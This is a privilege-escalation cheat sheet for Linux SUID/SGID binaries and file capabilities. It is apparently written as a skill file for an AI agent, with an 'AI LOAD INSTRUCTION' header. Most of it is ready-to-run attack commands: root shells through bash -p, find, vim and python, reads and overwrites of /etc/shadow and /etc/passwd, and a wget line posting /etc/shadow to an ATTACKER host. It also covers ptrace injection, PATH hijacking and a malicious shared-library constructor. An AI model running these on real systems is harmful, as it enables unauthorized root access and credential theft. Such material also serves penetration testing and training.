# SUID/SGID & Capabilities Exploitation Tricks

> **AI LOAD INSTRUCTION**: Load this for detailed SUID binary exploitation commands (GTFOBins top 30), capability-specific abuse techniques, and custom SUID exploitation. Assumes [SKILL.md](./SKILL.md) is loaded.

---

## 1. TOP 30 SUID BINARIES - EXPLOITATION COMMANDS

### 1.1 Shell / Interpreters

| Binary | Exploit Command |
|---|---|
| `bash` | `bash -p` |
| `sh` | `sh -p` |
| `dash` | `dash -p` |
| `zsh` | `zsh` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `perl` | `perl -e 'exec "/bin/sh";'` |
| `ruby` | `ruby -e 'exec "/bin/sh"'` |
| `php` | `php -r 'pcntl_exec("/bin/sh", ["-p"]);'` |

### 1.2 File Readers / Editors

| Binary | Exploit Command |
|---|---|
| `vim` / `vi` | `vim -c ':!/bin/sh'` |
| `less` | `less /etc/shadow` -> `!/bin/sh` |
| `more` | Paging mode -> `!/bin/sh` |
| `man` | `man man` -> `!/bin/sh` |

### 1.3 File Operations

| Binary | Exploit Command |
|---|---|
| `cp` | Copy `/etc/shadow`; or overwrite `/etc/passwd` |
| `tee` | `echo 'hacker:...:0:0::/root:/bin/bash' \| tee -a /etc/passwd` |
| `dd` | `dd if=/etc/shadow of=/tmp/shadow` |

### 1.4 Execution / Utility

| Binary | Exploit Command |
|---|---|
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `env` | `env /bin/sh -p` |
| `strace` | `strace -o /dev/null /bin/sh -p` |
| `taskset` | `taskset 1 /bin/sh -p` |
| `time` | `time /bin/sh -p` |

### 1.5 Network Binaries

| Binary | Exploit |
|---|---|
| `wget` | `wget --post-file=/etc/shadow http://ATTACKER/` |
| `curl` | `curl file:///etc/shadow` |
| `socat` | `socat stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane` |

---

## 2. CAPABILITY-SPECIFIC EXPLOITATION

### 2.1 cap_setuid (Most Dangerous)

```bash
# Python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
# PHP
php -r 'posix_setuid(0); system("/bin/bash");'
# Node.js
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'
```

### 2.2 cap_dac_override (Read/Write Any File)

```bash
vim /etc/shadow
vim /root/.ssh/authorized_keys
python3 -c '
f = open("/etc/shadow"); print(f.read())
'
```

### 2.3 cap_dac_read_search

```bash
tar czf /tmp/shadow.tar.gz /etc/shadow
base64 /etc/shadow | base64 -d
```

### 2.4 cap_sys_admin

```bash
mount /dev/sda1 /mnt/host   # full host access
unshare -r /bin/bash         # root inside namespace
```

### 2.5 cap_sys_ptrace (Process Injection)

```bash
gdb -p <root_pid> -batch -ex 'call system("chmod +s /bin/bash")'
```

### 2.6 cap_net_raw

```bash
tcpdump -i eth0 -w /tmp/capture.pcap -c 1000
```

### 2.7 cap_fowner / cap_chown

```bash
python3 -c 'import os; os.chown("/etc/shadow", 1000, 1000)'
```

---

## 3. CUSTOM SUID BINARY EXPLOITATION

```
1. file /path/to/binary && strings /path/to/binary
2. strace /path/to/binary 2>&1 (syscalls)
   ltrace /path/to/binary 2>&1 (library calls)
3. Injection vectors:
   - Calls system()/popen() with user input -> command injection
   - Opens files from PATH -> PATH hijack
   - Loads shared libs from writable dir -> lib hijack
```

### PATH Hijacking

```bash
echo '#!/bin/bash' > /tmp/service
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid_binary
```

### Shared Library Hijacking via RUNPATH

```bash
readelf -d /usr/local/bin/suid_binary | grep -i path
# RUNPATH: /home/user/lib
cat > /tmp/evil.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
static void pwn() __attribute__((constructor));
void pwn() { setuid(0); setgid(0); system("/bin/bash -p"); }
EOF
gcc -shared -fPIC -o /home/user/lib/libcustom.so /tmp/evil.c
```

---

## 4. QUICK-REFERENCE: CAPABILITIES -> EXPLOITATION

| Capability | Attack Type | Impact |
|---|---|---|
| `cap_setuid+ep` | Direct UID change | **Root shell** |
| `cap_dac_override+ep` | Read/write any file | **Shadow/passwd edit** |
| `cap_dac_read_search+ep` | Read any file | **Credential dump** |
| `cap_sys_admin+ep` | Mount, namespace | **Host filesystem** |
| `cap_sys_ptrace+ep` | Process injection | **Root process hijack** |
| `cap_sys_module+ep` | Load kernel modules | **Kernel rootkit** |
| `cap_net_raw+ep` | Raw sockets | **Credential sniffing** |
| `cap_fowner+ep` | Change file ownership | **Shadow ownership** |
